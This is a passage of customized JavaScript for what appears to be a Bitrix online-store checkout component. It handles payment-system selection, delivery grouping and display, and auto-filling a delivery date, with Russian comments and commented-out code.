                    children: [BX.create('DIV', {props: {className: 'bx-soa-pp-company-desc'}, html: paySystem.DESCRIPTION})]
                });
            }

            hiddenInput = BX.create('INPUT', {
                props: {
                    type: 'hidden',
                    name: 'PAY_CURRENT_ACCOUNT',
                    value: 'N'
                }
            });

            htmlString = this.params.MESS_INNER_PS_BALANCE + ' <b class="wsnw">' + this.result.CURRENT_BUDGET_FORMATED
                + '</b><br>' + (accountOnly ? BX.message('SOA_PAY_ACCOUNT3') : '');
            innerPsDesc = BX.create('DIV', {props: {className: 'bx-soa-pp-company-desc'}, html: htmlString});

            return BX.create('DIV', {
                props: {className: 'bx-soa-pp-inner-ps' + (isSelected ? ' bx-selected' : '')},
                children: [hiddenInput, subTitle, label, title, innerPsDesc]
            });

        }, editFadePaySystemContent: function (node) {
            var selectedPaySystem = this.getSelectedPaySystem(),
                errorNode = this.paySystemHiddenBlockNode.querySelector("div.alert.alert-danger"),
                warningNode = this.paySystemHiddenBlockNode.querySelector("div.alert.alert-warning.alert-show"),
                logotype, imgSrc;
            errorNode ? node.appendChild(errorNode.cloneNode(!0)) : this.getErrorContainer(node), warningNode && warningNode.innerHTML && node.appendChild(warningNode.cloneNode(!0)), this.isSelectedInnerPayment() || selectedPaySystem && selectedPaySystem.NAME || (addedHtml = "<strong>" + BX.message("SOA_PS_SELECT_ERROR") + "</strong>")
        }, getSelectedPaySystem: function () {
            var paySystemCheckbox = this.paySystemBlockNode.querySelector("input[name=PAY_SYSTEM_ID]:checked"),
                currentPaySystem = null, paySystemId, i;
            if (paySystemCheckbox || (paySystemCheckbox = this.paySystemHiddenBlockNode.querySelector("input[name=PAY_SYSTEM_ID]:checked")), paySystemCheckbox || (paySystemCheckbox = this.paySystemHiddenBlockNode.querySelector("input[type=hidden][name=PAY_SYSTEM_ID]")), paySystemCheckbox) for (paySystemId = paySystemCheckbox.value, i = 0; i < this.result.PAY_SYSTEM.length; i++) if (this.result.PAY_SYSTEM[i].ID == paySystemId) {
                currentPaySystem = this.result.PAY_SYSTEM[i];
                break
            }
            return currentPaySystem
        }, isSelectedInnerPayment: function () {
            var innerPaySystemCheckbox = this.paySystemBlockNode.querySelector("input[name=PAY_CURRENT_ACCOUNT]");
            return innerPaySystemCheckbox || (innerPaySystemCheckbox = this.paySystemHiddenBlockNode.querySelector("input[name=PAY_CURRENT_ACCOUNT]")), innerPaySystemCheckbox && innerPaySystemCheckbox.checked
        }, selectPaySystem: function (event) {
            if (this.orderBlockNode && event) {
                var target = event.target || event.srcElement,
                    innerPaySystemSection = this.paySystemBlockNode.querySelector("div.bx-soa-pp-inner-ps"),
                    innerPaySystemCheckbox = this.paySystemBlockNode.querySelector("input[name=PAY_CURRENT_ACCOUNT]"),
                    fullPayFromInnerPaySystem = this.result.TOTAL && 0 === parseFloat(this.result.TOTAL.ORDER_TOTAL_LEFT_TO_PAY),
                    innerPsAction = BX.hasClass(target, "bx-soa-pp-inner-ps") ? target : BX.findParent(target, {className: "bx-soa-pp-inner-ps"}),
                    actionSection = BX.hasClass(target, "bx-soa-pp-company") ? target : BX.findParent(target, {className: "bx-soa-pp-company"}),
                    actionInput, selectedSection;
                if (innerPsAction) "INPUT" == target.nodeName && (innerPaySystemCheckbox.checked = !innerPaySystemCheckbox.checked), innerPaySystemCheckbox.checked ? (BX.removeClass(innerPaySystemSection, "bx-selected"), innerPaySystemCheckbox.checked = !1) : (BX.addClass(innerPaySystemSection, "bx-selected"), innerPaySystemCheckbox.checked = !0); else if (actionSection) {
                    if (BX.hasClass(actionSection, "bx-selected")) return BX.PreventDefault(event);
                    innerPaySystemCheckbox && innerPaySystemCheckbox.checked && fullPayFromInnerPaySystem ? (BX.addClass(actionSection, "bx-selected"), (actionInput = actionSection.querySelector("input.bx-soa-pp-company-checkbox")).checked = !0, BX.removeClass(innerPaySystemSection, "bx-selected"), innerPaySystemCheckbox.checked = !1) : (selectedSection = this.paySystemBlockNode.querySelector(".bx-soa-pp-company.bx-selected"), BX.addClass(actionSection, "bx-selected"), (actionInput = actionSection.querySelector("input.bx-soa-pp-company-checkbox")).checked = !0, selectedSection && (BX.removeClass(selectedSection, "bx-selected"), selectedSection.querySelector("input.bx-soa-pp-company-checkbox").checked = !1))
                }
                this.sendRequest()
            }
        }, editDeliveryBlock: function (active) {
            this.deliveryBlockNode && this.deliveryHiddenBlockNode && this.result.DELIVERY && (this.editActiveDeliveryBlock(active), this.checkPickUpShow(), this.initialized.delivery = !0)
        }, editActiveDeliveryBlock: function (activeNodeMode) {
            // var node = this.deliveryBlockNode, deliveryContent, deliveryNode;
            // var deliveryItemsContainer = BX.create('DIV', {props: {className: 'col-sm-12 bx-soa-delivery'}});
            // this.result.IS_AUTHORIZED && !this.opened[this.deliveryBlockNode.id] && (this.opened[this.deliveryBlockNode.id] = !0, BX.removeClass(this.deliveryBlockNode, "bx-selected")), this.initialized.delivery || (this.opened[this.deliveryBlockNode.id] || this.deliveryBlockNode.classList.add("bx-step-completed"), (deliveryContent = node.querySelector(".bx-soa-section-content")) ? BX.cleanNode(deliveryContent) : (deliveryContent = this.getNewContainer(), node.appendChild(deliveryContent)), BX.cleanNode(node.querySelector(".bx-soa-section-location")), this.getDeliveryLocationInput(node.querySelector(".bx-soa-section-location")), this.getErrorContainer(deliveryContent), deliveryNode = BX.create("DIV", {props: {className: "bx-soa-pp row"}}), this.editDeliveryItems(deliveryNode), deliveryContent.appendChild(deliveryNode), this.editDeliveryInfo(deliveryNode), this.showPropInDelivery("ADDRESS", deliveryNode, BX.message("SOA_ADDRESS")), this.showPickUp(deliveryNode), this.showPropsInDelivery(deliveryNode, deliveryItemsContainer), this.getZipLocationInput(deliveryNode, deliveryItemsContainer), "Y" !== this.params.HIDE_ORDER_DESCRIPTION && this.editPropsComment(deliveryNode), this.getBlockFooter(deliveryContent)), activeNodeMode && this.initialized.delivery || this.getDeliveryCompactInfo()

            var node = activeNodeMode ? this.deliveryBlockNode : this.deliveryHiddenBlockNode,
                deliveryContent, deliveryNode;

            //fix скрытой доставки
            this.initialized.delivery = false;
            //fix скрытой доставки

            if (this.initialized.delivery)
            {
                BX.remove(BX.lastChild(node));
                node.appendChild(BX.firstChild(this.deliveryHiddenBlockNode));
            }
            else
            {
                deliveryContent = node.querySelector('.bx-soa-section-content');


                if (!deliveryContent)
                {
                    deliveryContent = this.getNewContainer();
                    node.appendChild(deliveryContent);
                }
                else
                    BX.cleanNode(deliveryContent);

                this.getErrorContainer(deliveryContent);


                var activeDelivery = 0;
                for (var k = 0; k < this.deliveryPagination.currentPage.length; k++)
                {
                    if(this.deliveryPagination.currentPage[k]['CHECKED'] == 'Y'){
                        var activeDelivery = this.deliveryPagination.currentPage[k]['ID'];
                    }
                }

                deliveryNode = BX.create('DIV', {props: {className: 'bx-soa-pp row'}});
                this.editDeliveryItems(deliveryNode);
                deliveryContent.appendChild(deliveryNode);

                /*штатные поля местоположение и Индекс, чтобы они корректно записывались в заказе. Скрыл стилями*/
                 this.getZipLocationInput(deliveryNode); // чтобы в админке правильный индекс записывался
                 BX.cleanNode(node.querySelector(".bx-soa-section-location"));
                 this.getDeliveryLocationInput(node.querySelector(".bx-soa-section-location")); // чтобы в админке правильное местоположение проставлялось


                if (this.params.SHOW_COUPONS_DELIVERY == 'Y')
                    this.editCoupons(deliveryContent);

                var curDeliveryName = this.getSelectedDelivery()['NAME'];
                if((curDeliveryName.indexOf('курьер') + 1) || curDeliveryName.indexOf('Курьер') + 1 || curDeliveryName.indexOf('КУРЬЕР') + 1){
                    //показывать поля везде кроме самовывоза

                    for(var i = 1;i<this.deliveryPropsArray.length;i++){
                        if(BX('soa-property-'+this.deliveryPropsArray[i].getId()) == null){
                            this.getPropertyRowNode(this.deliveryPropsArray[i], deliveryContent, false);
                        }
                    }
                }



                this.getBlockFooter(deliveryContent);
            }

        }, getDeliveryCompactInfo: function () {
            BX.remove(BX.lastChild(this.deliveryBlockNode.querySelector(".bx-compact-wrapper")));
            let currentDelivery = this.getSelectedDelivery();
            if (currentDelivery) {
                const childrenBlocks = [], $deliveryLabel = BX.create("div", {
                    props: {className: "bx-compact-title"},
                    html: currentDelivery.NAME
                });
                childrenBlocks.push($deliveryLabel);
                const $zipProp = this.deliveryBlockNode.querySelector("#zipProperty");
                if ($zipProp) {
                    const $zip = BX.create("div", {
                        props: {className: "bx-compact-prop"},
                        html: this.getDerivedBlock(BX.message("TITLE_SOA_DELIVERY_INDEX"), $zipProp.value)
                    });
                    childrenBlocks.push($zip)
                }
                const $location = BX.create("div", {
                    props: {className: "bx-compact-prop"},
                    html: this.getDerivedBlock(BX.message("TITLE_SOA_DELIVERY_CITY"), '<span class="destination_value">' + this.deliveryBlockNode.querySelector(".destination_value").textContent + "</span>")
                });
                childrenBlocks.push($location);
                const $addrProp = this.deliveryBlockNode.querySelector(".ADDRESS textarea");
                if ($addrProp && $addrProp.value) {
                    const $addr = BX.create("div", {
                        props: {className: "bx-compact-prop"},
                        html: this.getDerivedBlock(BX.message("TITLE_SOA_DELIVERY_ADDRESS"), $addrProp.value)
                    });
                    childrenBlocks.push($addr)
                }
                const $commentProp = this.deliveryBlockNode.querySelector("#orderDescription");
                if ($commentProp && $commentProp.value) {
                    const $comment = BX.create("div", {
                        props: {className: "bx-compact-prop"},
                        html: this.getDerivedBlock(BX.message("TITLE_SOA_DELIVERY_COMMENT"), $commentProp.value)
                    });
                    childrenBlocks.push($comment)
                }
                if (currentDelivery.PRICE_FORMATED) {
                    const $price = BX.create("div", {
                        props: {className: "bx-compact-prop"},
                        html: this.getDerivedBlock(BX.message("TITLE_SOA_DELIVERY_COST"), currentDelivery.PRICE ? currentDelivery.PRICE_FORMATED : BX.message("PRICE_FREE_DEFAULT"))
                    });
                    childrenBlocks.push($price)
                }
                if (currentDelivery.PERIOD_TEXT) {
                    const $period = BX.create("div", {
                        props: {className: "bx-compact-prop"},
                        html: this.getDerivedBlock(BX.message("SALE_SADC_TRANSIT"), currentDelivery.PERIOD_TEXT)
                    });
                    childrenBlocks.push($period)
                }
                const $wrapper = BX.create("div", {props: {className: "bx-compact-inner"}, children: childrenBlocks});
                this.deliveryBlockNode.querySelector(".bx-compact-wrapper").appendChild($wrapper)
            }
        }, getDerivedBlock: function (name, value) {
            return '<div class="bx-compact__prop-title">' + name + '</div><div class="bx-compact__prop-value">' + value + "</div>"
        }, showPropInDelivery: function (propCode, node, title) {
            if (!this.result.ORDER_PROP || !this.propertyCollection) return;
            var group, property, groupIterator = this.propertyCollection.getGroupIterator(), propsIterator, titleNode;
            title && (titleNode = BX.create("DIV", {props: {className: "bx-soa-title-subblock"}, text: title}));
            const $propInner = BX.create("DIV", {
                props: {className: "bx-soa-pp-company-item " + propCode},
                children: [titleNode]
            }), $prop = BX.create("DIV", {
                props: {className: "col-md-12 bx-soa-extraprops group-without-margin"},
                children: [$propInner]
            });
            let isAddProp = !1;
            for (; group = groupIterator();) for (propsIterator = group.getIterator(); property = propsIterator();) property.getSettings().CODE === propCode && (this.getPropertyRowNode(property, $propInner, !1, !1), isAddProp = !0);
            isAddProp && node.appendChild($prop)
        }, showPropsInDelivery: function (deliveryNode, deliveryItemsContainer) {
            var group, property, groupIterator = this.propertyCollection.getGroupIterator(), propsIterator;

            if (!deliveryItemsContainer)
                deliveryItemsContainer = this.propsBlockNode.querySelector('.col-sm-12.bx-soa-delivery');

            while (group = groupIterator())
            {
                propsIterator =  group.getIterator();
                while (property = propsIterator())
                {
                    if (property.getId()=='80' || property.getId()=='81' || property.getId()=='82' || property.getId()=='53' || property.getId()=='83' || property.getId()=='84' || property.getId()=='95' || property.getId()=='96' || property.getId()=='99' || property.getId()=='100' || property.getId()=='101') {

                        this.getPropertyRowNode(property, deliveryItemsContainer, false);
                        deliveryNode.appendChild(deliveryItemsContainer);

                    }
                }
            }
        }, showPickUp: function (node) {
            const $pickup = BX.create("div", {
                props: {id: "bx-soa-pickup", className: "col-md-12"},
                children: [BX.create("div", {props: {className: "bx-soa-section-content bx-soa-pp-company-item"}})]
            });
            node.appendChild($pickup), this.pickUpBlockNode = BX("bx-soa-pickup")
        }, editDeliveryItems: function (deliveryNode) {
            // if (this.result.DELIVERY && !(this.result.DELIVERY.length <= 0)) {
            //     var deliveryItemsContainer = BX.create("DIV", {props: {className: "col-sm-12 bx-soa-pp-item-container"}}),
            //         deliveryItemNode, k;
            //     for (k = 0; k < this.deliveryPagination.currentPage.length; k++) deliveryItemNode = this.createDeliveryItem(this.deliveryPagination.currentPage[k]), deliveryItemsContainer.appendChild(deliveryItemNode);
            //     this.deliveryPagination.show && this.showPagination("delivery", deliveryItemsContainer), deliveryNode.appendChild(deliveryItemsContainer)
            // }
            if (!this.result.DELIVERY || this.result.DELIVERY.length <= 0)
                return;

            var deliveryItemsContainer = BX.create('DIV', {props: {className: 'col-sm-12 bx-soa-pp-item-container deliveries'}}),
                deliveryItemNode, k,deliveryGroupNode,deliveryGroupAnotherNode;
            var _this = this;

            //создадим группы доставок и потом раскинем сами доставки

            for (var key in this.deliveryGroup) {
                _this.createDeliveryGroup(key,_this.deliveryPagination.currentPage,false);
            }

            var deliveryItems = this.deliveryPagination.currentPage.slice();

            //убираем доставки, которые уже вошли в группы, чтоб добавить все остальные в группу "Другое"

            for(k = 0; k < this.deliveryPropsReady.length; k++){
                delete deliveryItems[this.deliveryPropsReady[k]];
            }
            deliveryItems = deliveryItems.filter((el) => el !== undefined);

            // тут засунем всё остальное в группу "Другое"
            if(deliveryItems.length > 0){
                _this.createDeliveryGroup("другое",deliveryItems,true);
            }

            //а теперь пытаемся создать ноды на всё это дело

            this.createDeliveryGroupNode(deliveryNode);

            var currentGroupDelivery = "";
            for(var key in this.deliveryGroup){
                if(this.deliveryGroup[key]['CHECKED'] == 'Y'){
                    currentGroupDelivery = key;
                }
            }



            for (k = 0; k < this.deliveryPagination.currentPage.length; k++)
            {

                deliveryItemNode = this.createDeliveryItem(this.deliveryPagination.currentPage[k],currentGroupDelivery,deliveryNode);
                deliveryItemsContainer.appendChild(deliveryItemNode);
            }

            if (this.deliveryPagination.show)
                this.showPagination('delivery', deliveryItemsContainer);

            deliveryNode.appendChild(deliveryItemsContainer);

        },
        //webc
        createDeliveryGroupNode: function(deliveryNode){
            var deliveryGroupNode = BX.create('DIV', {props: {className: 'deliveryBlockNode'}});
            var deliveryItemsContainer = BX.create('DIV', {props: {className: 'col-sm-12 bx-soa-pp-item-container2'}});
            var countTabsGroup = 0;
            for(var key in this.deliveryGroup){
                if(this.deliveryGroup[key].ELEMENTS.length > 0){
                    countTabsGroup++;
                }
            }

            for(var key in this.deliveryGroup){
                if(this.deliveryGroup[key].ELEMENTS.length > 0){
                        var deliveryNodeItem = this.createDeliveryGroupItem(this.deliveryGroup[key],key,countTabsGroup);
                        deliveryItemsContainer.appendChild(deliveryNodeItem);
                }
            }

            for (i = 0; i < this.result.DELIVERY.length; i++)
            {
                if (this.result.DELIVERY[i].CHECKED == 'Y')
                {
                    var curDeliveryId = this.result.DELIVERY[i]['ID'];
                }
            }

            //END WEBC

            deliveryNode.appendChild(deliveryItemsContainer);
        },

        //webc
        createDeliveryGroupItem: function(item,key,countTabsGroup){
            var checked = item.CHECKED == 'Y',
                deliveryId = item.NAME,
                labelNodes = [
                    BX.create('INPUT', {
                        props: {
                            id: 'ID_DELIVERY_GROUP_' + item.ID,
                            name: 'DELIVERY_GROUP',
                            type: 'checkbox',
                            className: 'bx-soa-pp-company-checkbox',
                            value: deliveryId,
                            checked: checked
                        }
                    })
                ],
                //deliveryCached = this.deliveryCachedInfo[deliveryId],
                logotype, label, title, itemNode, logoNode;

            logoNode = BX.create('DIV', {props: {className: 'bx-soa-pp-company-image'}});


            labelNodes.push(
                BX.create('SPAN', {
                    props: {
                        className: 'ellipse'
                    },
                    html: '<svg fill="#E1E1E1" width="24" height="24" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg"><circle cx="12" cy="12" r="11.5" fill="white" stroke="#E1E1E1"></circle><circle cx="12" cy="12" r="5"></circle></svg>'
                })
            );


            if (this.params.SHOW_DELIVERY_LIST_NAMES == 'Y')
            {
                title = BX.create('DIV', {
                    props: {className: 'bx-soa-pp-company-smalltitle'},
                    text: this.params.SHOW_DELIVERY_PARENT_NAMES != 'N' ? item.NAME : item.OWN_NAME
                });
                labelNodes.push(title);
            }

            var labelNodesLabel =
                BX.create('LABEL', {
                    attrs: {'for': 'ID_DELIVERY_GROUP_' + item.ID},
                    props: {className: 'orderLabel'},
                    children: labelNodes
                })
            ;

            //labelNodes.appendChild(labelNodesLabel);


            label = BX.create('DIV', {
                props: {
                    className: 'bx-soa-pp-company-graf-container'
                    // + (item.CALCULATE_ERRORS || deliveryCached && deliveryCached.CALCULATE_ERRORS ? ' bx-bd-waring' : '')
                },
                children: [labelNodesLabel,labelNodes]
            });


            itemNode = BX.create('DIV', {
                props: {className: 'bx-soa-pp-company col-lg-12 col-sm-12 col-xs-12 ' + 'GROUP_'+key},//(12/countTabsGroup)
                children: [label],
                events: {click: BX.proxy(this.selectDeliveryGroup, this)}
            });
            if(!this.firstLoadToHide){
                checked && BX.addClass(itemNode, 'bx-selected2');
            }


            if (checked)
                this.lastSelectedDeliveryGroup = key;

            return itemNode;
        },

        selectDeliveryGroup: function(event)
        {
            if (!this.orderBlockNode)
                return;

            // $('.deliveries').css("display",'block');


            var target = event.target || event.srcElement,
            actionSection =  BX.hasClass(target, 'bx-soa-pp-company') ? target : BX.findParent(target, {className: 'bx-soa-pp-company'}),
            selectedSection = this.deliveryBlockNode.querySelector('.bx-soa-pp-company.bx-selected2'),
            actionInput, selectedInput;



            if (BX.hasClass(actionSection, 'bx-selected2'))
                return BX.PreventDefault(event);

            if (actionSection)
            {
                actionInput = actionSection.querySelector('input[type=checkbox]');
                BX.addClass(actionSection, 'bx-selected2');
                actionInput.checked = true;
            }
            if (selectedSection)
            {
                selectedInput = selectedSection.querySelector('input[type=checkbox]');
                BX.removeClass(selectedSection, 'bx-selected2');
                selectedInput.checked = false;
            }

            var targetText = $(target).text();

            $('#bx-soa-delivery .deliveries').css("display",'block');
            if(targetText == "Доставить курьером"){
                $('.bx-soa-customer-field[data-property-id-row="56"]').css("display",'block');
                //$('.bx-soa-customer-field[data-property-id-row="26"]').css("display",'block');
                $('.bx-soa-customer-field[data-property-id-row="95"]').css("display",'block');
                $('.bx-soa-customer-field[data-property-id-row="96"]').css("display",'block');
                $('.bx-soa-customer-field[data-property-id-row="81"]').css("display",'block');
                $('.bx-soa-customer-field[data-property-id-row="82"]').css("display",'block');
                $('.bx-soa-customer-field[data-property-id-row="83"]').css("display",'block');
                $('.bx-soa-customer-field[data-property-id-row="53"]').css("display",'block');
            }else{
                $('.bx-soa-customer-field[data-property-id-row="56"]').hide();
                //$('.bx-soa-customer-field[data-property-id-row="26"]').hide();
                $('.bx-soa-customer-field[data-property-id-row="95"]').hide();
                $('.bx-soa-customer-field[data-property-id-row="96"]').hide();
                $('.bx-soa-customer-field[data-property-id-row="81"]').hide();
                $('.bx-soa-customer-field[data-property-id-row="82"]').hide();
                $('.bx-soa-customer-field[data-property-id-row="83"]').hide();
                $('.bx-soa-customer-field[data-property-id-row="53"]').hide();
            }

            $('#bx-soa-delivery .bx-soa-pp-item-container > div').addClass('hidden');

            for(var key in this.deliveryGroup){

                if(this.deliveryGroup[key]['NAME'] == targetText){
                    if(key !== 'другое'){
                        $('#bx-soa-delivery .bx-soa-pp-item-container > .GROUP_'+key).removeClass('hidden');
                    }else{
                        $('#bx-soa-delivery .bx-soa-pp-item-container > .GROUP_ANOTHER').removeClass('hidden');
                    }
                }
            }
            $('.bx-soa-pp-item-container2 .bx-selected2').append($('.deliveries'));
            //$('.bx-soa-pp-item-container > div:eq(1)').not('.hidden').trigger('click');


            // this.sendRequest();
        },

        createDeliveryGroup: function(group,item,another){
            var elements = [];
            //надо проставить активность у групп и наполнить массив групп доставками
            if(group != "другое"){
                for(var k = 0; k < item.length; k++){
                    var lowerCaseName = item[k]["NAME"].toLowerCase();
                    if(lowerCaseName.indexOf(group) + 1){
                        this.deliveryGroup[group].ELEMENTS.push(item[k]);
                        if(this.deliveryPropsReady.length == 0){
                            this.deliveryGroup[group].CHECKED = 'Y';
                        }
                        this.deliveryPagination.currentPage[k].GROUP = group;
                        this.deliveryPropsReady.push(k);
                    }

                }
            }

            if(another){
                for(var k = 0; k < item.length; k++){
                    this.deliveryGroup[group].ELEMENTS.push(item[k]);
                }
            }
        },

        editDeliveryInfo: function (deliveryNode,curDelivery) {
            // if (this.result.DELIVERY) {
            //     var deliveryInfoContainer = BX.create("DIV", {props: {className: " bx-soa-pp-desc-container"}}),
            //         currentDelivery, logotype, name, logoNode, subTitle, label, title, price, period, clear, infoList,
            //         extraServices, extraServicesNode;
            //     BX.cleanNode(deliveryInfoContainer), currentDelivery = this.getSelectedDelivery(), title = BX.create("DIV", {
            //         props: {className: "bx-soa-pp-company-block"},
            //         children: [BX.create("DIV", {props: {className: "bx-soa-pp-company-desc"}, html: ""})]
            //     }), clear = BX.create("DIV", {style: {clear: "both"}}), (extraServices = this.getDeliveryExtraServices(currentDelivery)).length && (extraServicesNode = BX.create("DIV", {
            //         props: {className: "bx-soa-pp-company-item col-md-6"},
            //         children: extraServices
            //     }), deliveryNode.appendChild(BX.create("DIV", {
            //         props: {className: "col-md-12 bx-soa-extraservices"},
            //         children: [extraServicesNode]
            //     })), extraServicesNode = BX.create("DIV", {
            //         props: {className: "bx-soa-pp-company-block"},
            //         children: extraServices
            //     })), deliveryInfoContainer.appendChild(BX.create("DIV", {
            //         props: {className: "bx-soa-pp-company"},
            //         children: [title, clear, extraServicesNode]
            //     }));
            //     var injectNodes = BX.findChildren(this.deliveryBlockNode, {className: "bx-soa-pp-company-inject"}, !0),
            //         deliveryNode;
            //     if (injectNodes && injectNodes.length) for (var i = 0; i < injectNodes.length; ++i) BX.addClass(injectNodes[i], "hidden"), BX.cleanNode(injectNodes[i]);
            //     if ((deliveryNode = BX.findChildren(this.deliveryBlockNode, {
            //         className: "bx-soa-pp-company",
            //         attribute: {"data-id": currentDelivery.ID}
            //     }, !0)) && deliveryNode.length) {
            //         var injectNode = BX.findChildren(deliveryNode[0], {className: "bx-soa-pp-company-inject"}, !0);
            //         injectNode && injectNode.length && (BX.cleanNode(injectNode[0]), injectNode[0].appendChild(deliveryInfoContainer), BX.removeClass(injectNode[0], "hidden"))
            //     }
            //     "Y" != this.params.DELIVERY_NO_AJAX && (this.deliveryCachedInfo[currentDelivery.ID] = currentDelivery)
            // }

            if (!this.result.DELIVERY)
                return;


            var deliveryInfoContainer = BX.create('DIV', {props: {className: 'col-sm-5 bx-soa-pp-desc-container'}})

            BX.cleanNode(deliveryInfoContainer);
            var currentDelivery = curDelivery;

            if (currentDelivery.ID == 39) {
                var numDeliveryDate = parseInt(3);
            }else{
                var numDeliveryDate = parseInt(currentDelivery.PERIOD_TEXT.match(/\d+/));
            }
            
            var arThisDate = new Date();
            console.log(numDeliveryDate);
            var arDateDelivery = new Date(arThisDate.getTime() + (numDeliveryDate * 3600 * 24 * 1000));

            var dd = arDateDelivery.getDate(); 
            var mm = arDateDelivery.getMonth() + 1;; 
            var yyyy = arDateDelivery.getFullYear(); 

            if ((mm >= 1) && (mm < 10)) {
                mm = '0' + mm;
            }

            if ((dd >= 1) && (dd < 10)) {
                dd = '0' + dd;
            }

            // console.log(dd);
            // console.log(mm);
            // console.log(yyyy);

            var arDateDeliveryText = dd + '.' + mm + '.' + yyyy;
            $(document).ready(function() {
                //Автозаполнение даты доставки
                $('[name=ORDER_PROP_105]').val(arDateDeliveryText);
            });

            var deliveryInfoContainer = BX.create('DIV', {props: {className: 'col-sm-5 bx-soa-pp-desc-container'}}),
                currentDelivery, logotype, name, logoNode,
                subTitle, label, title, price, period,
                clear, infoList, extraServices, extraServicesNode;

            BX.cleanNode(deliveryInfoContainer);
            var currentDelivery = curDelivery;

            logoNode = BX.create('DIV', {props: {className: 'bx-soa-pp-company-image'}});
            logotype = this.getImageSources(currentDelivery, 'LOGOTIP');
            if (logotype && logotype.src_2x)
            {
                logoNode.setAttribute('style',
                    'background-image: url("' + logotype.src_1x + '");' +
                    'background-image: -webkit-image-set(url("' + logotype.src_1x + '") 1x, url("' + logotype.src_2x + '") 2x)'
                );
            }
            else
            {
                logotype = logotype && logotype.src_1x || this.defaultDeliveryLogo;
                logoNode.setAttribute('style', 'background-image: url("' + logotype + '");');
            }

            name = this.params.SHOW_DELIVERY_PARENT_NAMES != 'N' ? currentDelivery.NAME : currentDelivery.OWN_NAME;

            if (this.params.SHOW_DELIVERY_INFO_NAME == 'Y')
                subTitle = BX.create('DIV', {props: {className: 'bx-soa-pp-company-subTitle'}, text: name});

            label = BX.create('DIV', {
                props: {className: 'bx-soa-pp-company-logo'},
                children: [
                    BX.create('DIV', {
                        props: {className: 'bx-soa-pp-company-graf-container'},
                        children: [logoNode]
                    })
                ]
            });
            title = BX.create('DIV', {
                props: {className: 'bx-soa-pp-company-block'},
                children: [
                    BX.create('DIV', {props: {className: 'bx-soa-pp-company-desc'}, html: currentDelivery.DESCRIPTION}),
                    currentDelivery.CALCULATE_DESCRIPTION
                        ? BX.create('DIV', {props: {className: 'bx-soa-pp-company-desc'}, html: currentDelivery.CALCULATE_DESCRIPTION})
                        : null
                ]
            });


            if (currentDelivery.PRICE >= 0)
            {
                price = BX.create('LI', {
                    children: [
                        BX.create('DIV', {
                            props: {className: 'bx-soa-pp-list-termin'},
                            html: this.params.MESS_PRICE + ':'
                        }),
                        BX.create('DIV', {
                            props: {className: 'bx-soa-pp-list-description'},
                            children: this.getDeliveryPriceNodes(currentDelivery)
                        })
                    ]
                });
            }

            if (currentDelivery.PERIOD_TEXT && currentDelivery.PERIOD_TEXT.length)
            {
                period = BX.create('LI', {
                    children: [
                        BX.create('DIV', {props: {className: 'bx-soa-pp-list-termin'}, html: this.params.MESS_PERIOD + ':'}),
                        BX.create('DIV', {props: {className: 'bx-soa-pp-list-description'}, html: currentDelivery.PERIOD_TEXT})
                    ]
                });
            }

            clear = BX.create('DIV', {style: {clear: 'both'}});
            infoList = BX.create('UL', {props: {className: 'bx-soa-pp-list'}, children: [title,period]});
            extraServices = this.getDeliveryExtraServices(currentDelivery);

            if (extraServices.length)
            {
                extraServicesNode = BX.create('DIV', {
                    props: {className: 'bx-soa-pp-company-block'},
                    children: extraServices
                });
            }

            //информация по доставке
            deliveryInfoContainer.appendChild(
                BX.create('DIV', {
                    props: {className: 'bx-soa-pp-company-custom col-md-12'},
                    children: [infoList]
                })
            );
            deliveryNode.appendChild(deliveryInfoContainer);

            if (this.params.DELIVERY_NO_AJAX != 'Y')
                this.deliveryCachedInfo[currentDelivery.ID] = currentDelivery;


            // Вывод местоположения в блоке доставки
            // var deliveryItemsContainer = $('#bx-soa-region-hidden .bx_soa_location.row')[0];
            // deliveryNode.prepend(deliveryItemsContainer);


            var deliveryItemsContainer = BX.create('DIV', {props: {className: 'bx-soa-custom-hidden'}}),
                group, property, groupIterator = this.propertyCollection.getGroupIterator(), propsIterator;
            if (!deliveryItemsContainer)
                deliveryItemsContainer = this.propsBlockNode.querySelector('.bx-soa-custom-hidden');
            while (group = groupIterator())
            {
                propsIterator =  group.getIterator();
                while (property = propsIterator())
                {
                    if (property.getName()=='Другой город') { //Если свойство совпадает с названием поля адреса в вашей системе
                        this.getPropertyRowNode(property, deliveryItemsContainer, false); //вставляем свойство в подготовленный контейнер
                        deliveryNode.appendChild(deliveryItemsContainer); //контейнер вместе со свойством в нём добавляем в конце блока с описанием (deliveryInfoContainer)
                    }
                }
            }


        }, getDeliveryPriceNodes: function (delivery) {
            var priceNodesArray;
            return priceNodesArray = void 0 !== delivery.DELIVERY_DISCOUNT_PRICE && parseFloat(delivery.DELIVERY_DISCOUNT_PRICE) != parseFloat(delivery.PRICE) ? parseFloat(delivery.DELIVERY_DISCOUNT_PRICE) > parseFloat(delivery.PRICE) ? [delivery.DELIVERY_DISCOUNT_PRICE_FORMATED] : [delivery.DELIVERY_DISCOUNT_PRICE_FORMATED, BX.create("BR"), BX.create("SPAN", {
                props: {className: "bx-price-old"},
                html: delivery.PRICE_FORMATED
            })] : [delivery.PRICE_FORMATED]
        }, getDeliveryExtraServices: function (delivery) {
            // var extraServices = [], brake = !1, i, currentService, serviceNode, serviceName, input;
            // for (i in delivery.EXTRA_SERVICES.length && extraServices.push(BX.create("div", {
            //     props: {className: "bx-soa-title-subblock"},
            //     html: BX.util.htmlspecialchars(BX.message("SOA_TITLE_SERVICE"))
            // })), delivery.EXTRA_SERVICES) if (delivery.EXTRA_SERVICES.hasOwnProperty(i) && (currentService = delivery.EXTRA_SERVICES[i]).canUserEditValue) {
            //     if (-1 == currentService.editControl.indexOf("this.checked")) serviceName = BX.create("LABEL", {html: BX.util.htmlspecialchars(currentService.name) + (currentService.price ? " (" + currentService.priceFormatted + ")" : "")}), 0 == i && (brake = !0), serviceNode = BX.create("DIV", {
            //         props: {className: "form-group bx-soa-pp-field"},
            //         html: currentService.editControl + (currentService.description && currentService.description.length ? '<div class="bx-soa-service-small">' + BX.util.htmlspecialchars(currentService.description) + "</div>" : "")
            //     }), BX.prepend(serviceName, serviceNode), (input = serviceNode.querySelector("input[type=text]")) || (input = serviceNode.querySelector("select")), input && BX.addClass(input, "form-control"); else {
            //         let serviceID = currentService.editControl.match(/name="(.+?)"/);
            //         serviceNode = BX.create("DIV", {
            //             props: {className: "form-group filter label_block"},
            //             children: [currentService.editControl.replace("onchange", 'id="' + serviceID[1] + '" onchange'), BX.create("LABEL", {
            //                 props: {htmlFor: serviceID[1]},
